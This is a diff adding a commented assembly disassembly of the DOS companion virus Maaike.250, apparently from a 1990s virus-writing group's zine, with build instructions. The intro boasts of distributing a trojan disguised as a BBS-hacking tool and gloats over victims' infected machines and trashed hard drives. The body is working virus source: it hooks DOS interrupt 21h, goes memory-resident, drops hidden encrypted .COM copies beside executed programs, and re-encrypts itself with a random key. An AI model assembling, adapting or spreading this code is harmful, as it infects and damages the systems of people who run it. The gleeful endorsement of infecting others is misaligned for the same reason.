@@ -1,0 +1,277 @@
+;  ÉÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ»
+;  ³ ú ş                         Maaike.250                           ş ú ³
+;  ÈÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ¼
+
+  Comment #
+
+  General Info>
+
+  Okey, this is a good dissassembly of the virus called Maaike.250, that
+  circulated around on the boards in the file RAUSER.COM, which was 
+  described as an utility to hack any remote access board. Funny isn't 
+  it? Doesn't those board-crashers deserve to get infected? Well, I
+  most certainly think they do!
+
+  But those loosers are really funny! They contacted the a-v persons and
+  cried out "Help me! I got virus infected when I thought about hacking 
+  boards!" Puke! So, what did I do about it? Heh. Of'cos taking advantages
+  about all the "wanna-be hackers" dreams.
+
+  Well, I as well released such a program, described in the 
+  file_id.diz  as:
+
+   ***********************************************************
+   *** PROGRAM ABOUT HOW TO GET FULL-REMOTE-ACCESS CONTROL ***
+   *** OVER *MOST* OF THE BBS-PROGRAMS USED TODAY!         ***   
+   *** INCLUDES: EVL/PCE/PCB/SBBS/RA/OBV AND MUCH MORE!	   ***
+   *** (C) 1994 SWEDISH LIBERATION FRONT!		   ***
+   ***********************************************************
+
+  ..and naturally enough we got quite a few reports concerning
+  infected computers as well as trashed harddrives :). The first was sent 
+  by Daniel Prember on Swe.vir so therefor we decided to nominate this 
+  person as the winner of Immortal Riot's "hacker-wanna-be" award! 
+  Congratulation! (Yeh, I did mimic NuKE IJ#5, but this is our fifth 
+  journal, so.. :) )
+
+  Anyhow, back to the Maiike.250 virus!
+
+  Function>
+  This virus will go resident with an int27h routine (TSR), taking 816 
+  bytes in memory (you can see it with a mem /c). When you execute an 
+  EXE-program,it'll drop itself as a hidden .COM file with the same name 
+  as the EXE-file. This will result in the COM program running first. 
+  It's encrypted, and uses a neat routine for getting the XOR-value. 
+  However, it can be detected with a simple scan-string.
+
+  The Int27h problem>
+  When you re-boot the computer, and trow the virus out from the
+  memory and later run an "infected" EXE (i.e the com-program), the virus
+  will just go memory resident, without running the EXE-program. But when
+  you 2 seconds later run the file again, it'll work just normally. So,
+  no big deal really, but easily detected.
+
+  Important Note>
+  For getting this to a com file write:
+  Tasm /m2 Maaike.asm ş Tlink /t Maaike.obj
+
+  Credits>
+  All credits to Holy Beasts for doing this dissassembly! #
+;-------------------------------------------------------------------------------
+Xor_Val  Equ 0                                  ; Random encryption value!
+xor_start       Equ     15h			; 
+Old_Int_21h     Equ     1Fah			; 
+
+%OUT ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
+%OUT Û THIS IS ONLY FOR EDUCATIONAL PURPOSES AND SHOULD NOT BE SPREAD!!! Û
+%OUT ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+
+
+.Model Tiny
+.Code
+org    100h
+
+
+
+start:
+        Mov     Bx,0		        ; Zero BX register
+        Mov     Si, Offset Decrypt      ; Start Offset
+        Mov     Di, Offset Decrypt      ; Start Offset
+        Mov     Cx,74h                  ; Nr# Words To Xor
+                                        ; Note: Words Not Bytes
+Decrypter:
+        Lodsw                           ; Load The String In Ax
+        Xor     Ax,bx                   ; Xor It (Decrypt It)
+        Stosw                           ; Put It Back To Memory
+        Push    Cx                      ; 
+
+Stupid:
+        Wait                            ; No Operation (4-5 Clocks)
+                                        ; Why Use Wait ? Much Better
+                                        ; To Use Nopz...
+        Loop    Stupid                  ; Loop Cx Times
+                                        ; The Computer Will Do
+                                        ; Allot Of Waits, This
+                                        ; Will Stop The Prefrech
+
+        Pop     Cx                      ; Restore Cx
+Decrypt:        
+        Loop    Decrypter               ; Do The Decrypting
+
+         Mov     Ax,3521h                ; Get Original Interrupt Vectors
+         Int     21h                     ; For Interrupt 21h
+                                                
+         Mov     Ds:Old_Int_21h,bx       ; Save 'em
+         Mov     Ds:Old_Int_21h+2,es     ; ---""---
+         Mov     Dx,offset Int_21h_entry ; Load Dx With The Offset Of Our
+                                         ; New Int 21h Handler (virus)
+         Mov     Ah,25h                  ; Set The Interrupt Vectors To
+         Int     21h                     ; Our Int 21h Handler
+                                         ;
+         Mov     Dx, Offset End_Virii    ; Dx=Virii Size + Psp
+         Int     27h                     ; Terminate & Stay Resident
+
+Silly_Text          Db      'Maaike I Love You !'
+;		    ^^^^^ Deutch little girlie!
+;  ÉÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ»
+;  ³ ú ş               Our New Interrupt 21h Handler                  ş ú ³
+;  ÈÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ¼
+
+int_21h_entry:
+         Cmp     Ah, 4Bh                 ; Are They Trying To Execute
+                                         ; Any Program ?
+         Je      Infect                  ; If Yes, Infect it!
+         Jmp     Quit_virii              ; No?, then quit!
+infect:
+         Push    Di                      ; 
+         Push    Ax                      ; Save All The 
+         Push    Es                      ; Registers
+         Push    Ds                      ; 
+         Pop     Es                      ; Es=Ds
+         Mov     Cx,90h                  ; Number Of Times To Compare
+         Mov     Di,dx                   ; Ds=Offset Filename To Exec.
+         Mov     Al,'.'                  ; '.'
+         Repne   Scasb                   ; Search Until We Find '.'
+                                         ; in the Filename
+         Push    Di                      ; Save Destination Index
+         Mov     Ax,5845h                ; Ax='Xe' Word Wrap Format Ex
+         Stosw                           ; Store 'Ex' Right After '.'
+                                         ; In The Filename
+         Stosb                           ; Store 'E' Togheter With The
+                                         ; Stosw We Have Changed The
+                                         ; Filename Extension To 'Exe'
+         Pop     Di                      ;
+         Pop     Es                      ; Restore Some Of The
+         Pop     Ax                      ; Saved Registers
+         Push    Ax                      ; Save Some 
+         Push    Dx                      ; More Registers
+         Pushf                           ; Simulate An Interuppt Call
+         Call Far Ptr Quit_virii         ; Make The Call
+                                         ; The Loaded Program Has
+                                         ; Been Quitted Now...
+         Mov     Ax,4F43h                ; Ax='Oc' Reversed 'Co'
+         Stosw                           ; Store The New File Ext.
+         Mov     Al,4Dh                  ; Al='M'
+         Stosb                           ; And Put The M, And We Got
+                                         ; A New File Extension...'Com'
+         Pop     Dx                      ; Restore These
+         Pop     Ax                      ; Registers
+         Jnc     Go_On                   ; No Error When We Executed?
+                                         ; Quit If There Was A Problem
+         Jmp     Error                   ; When We Executed!­!
+Go_On:                                          
+         Push    Bx                      ; Push Some Registers
+         Push    Ds                      ;
+         Push    Es                      ;
+         Push    Di                      ;
+                
+         Xor     Ax,ax                   ; This Little Trick 
+         Out     43h,al                  ; Is Used When You Want To
+         In      Al,40h                  ; Get A Random Number,in This
+         Xchg    Al,ah                   ; Case, A Random Value To
+         In      Al,40h                  ; Crypt With
+                
+         Mov     Bx,ax                   ; Bx=random Value
+         Push    Cs                      ; 
+         Pop     Ds                      ; Ds=Cs
+         Mov     Word Ptr Cs:[101h],bx   ; Change This Virus Decrypt
+                                         ; Value To Our New Random Val
+         Cmp     Bl,0Eh                  ; If Bl Not Equal 0Eh 
+         Jne     No_mez                  ; Then Jump To No_mez
+         Mov     Ax,0B800h               ; Ax=B800h, Video Memory
+         Mov     Es,ax                   ; Es=B800h
+         Mov     Ah,0C2h                 ; Ah=C2h
+         Xor     Di,di                   ; Zero Destination Index
+         Mov     Cx,69h                  ; Cx=69h
+Again:
+         Push    Cx                      ; Save Cx
+         Mov     Si,offset Silly_Text    ; úş'Maaike I Love You !'şú
+         Mov     Cl,13h                  ; Cl=Nr# Characters
+
+Write_mez:
+          Lodsb                           ; Read The Characters
+          Stosw                           ; Put It On The Screen
+          Loop    Write_mez               ; Write Whole Mezzy
+
+          Pop     Cx                      ; Restore Cx
+          Loop    Again                   ; Repeat Writing A Few Times
+
+no_mez:
+          Push    Cs                      ;
+          Pop     Es                      ; Es=Cs
+          Xor     Di,di                   ; Di=0
+          Mov     Si,100h                 ; Si=0100h (Virii Start)
+          Mov     Cl,0Fah                 ; Cl=Virii Size
+          Rep     Movsb                   ; Move Virii From 100 To 0
+          Mov     Cl,74h                  ; 't'
+          Mov     Si,xor_start            ; Si=Crypt Start
+          Mov     Di,si                   ; Di=Si
+
+Encrypt:
+          Lodsw                           ; Load A Word
+          Xor     Ax,bx                   ; Encrypt It
+          Stosw                           ; Put It Back
+          Loop    Encrypt                 ; Do This A Few Times
+
+          Mov     Al,3                    ; Al=3
+          And     Bl,3                    ; Get A Random Value Between
+                                          ; 0-3
+          Mul     Bl                      ; Ax=3*Bl
+          Mov     Si,ax                   ; Si=Ax
+          Mov     Cl,3                    ; Cl=3                  
+          Mov     Di,3                    ; Di=3
+ag:
+          Add     Si,103h                 ; Add Si With 103h
+
+_move:
+          Cmp     Si,109h                 ; Repeat Until We Get
+          Jbe     Okay                    ; Jump If Below Or =
+          Xor     Si,si                   ; Zero Register
+          Jmp     Short Ag
+okay:
+          Movsw                           ; 
+          Movsb                           ; 
+          Loop    _move                   ; 
+
+ Comment +
+  What these few lines of code above really do is (nothing) that they
+  move a few bytes to another place in virus where the data is the 
+  same as the value we're moving. In other words, they are some lines 
+  that really doesn't do anything and they are there probably only 
+  because the author of the virus (maaike? :) want to make the life 
+  of av-producers a bit harder but it seems like he haven't succed... +
+            
+          Pop     Di                      ;
+          Pop     Es                      ;
+          Pop     Ds                      ; Ds:Dx=File Name (Asciiz)
+          Pop     Bx                      ;
+          Mov     Cx,22h                  ; Attr: Hidden, Archive
+          Mov     Ah,3Ch                  ; Function 3Ch
+          Int     21h                     ; Create/Truncate File
+                                          ; 
+          Xchg    Bx,ax                   ; Bx=File Handle
+          Push    Cs
+          Pop     Ds                      ; Ds=Cs (Ds:Dx=Data To Write)
+          Mov     Cl,0Fah                 ; 250 Bytes To Write
+          Xor     Dx,dx                   ; Offset Of Virii To Write
+          Mov     Ah,40h                  ; Function 40h, Write To
+                                          ; File Or Device, We Will
+                                          ; Soon Jump To The Real 
+Error:                                    ; Interrupt 21h Handler
+         Pop     Di
+
+
+;ÉÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ»
+;³ ú ş                            Quit Part                            ş ú ³
+;ÈÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ¼
+
+Quit_Virii:
+
+         Db      0Eah     ; Eah=Jump
+End_Virii:                ; Virus Will Put Original Int. Vec.
+                          ; Here, When Virus Is Loaded, There Will
+                          ; Be A Jmp Old_int_vectors At This Pos.
+     
+         End     Start
+
+                        = The Unforgiven =
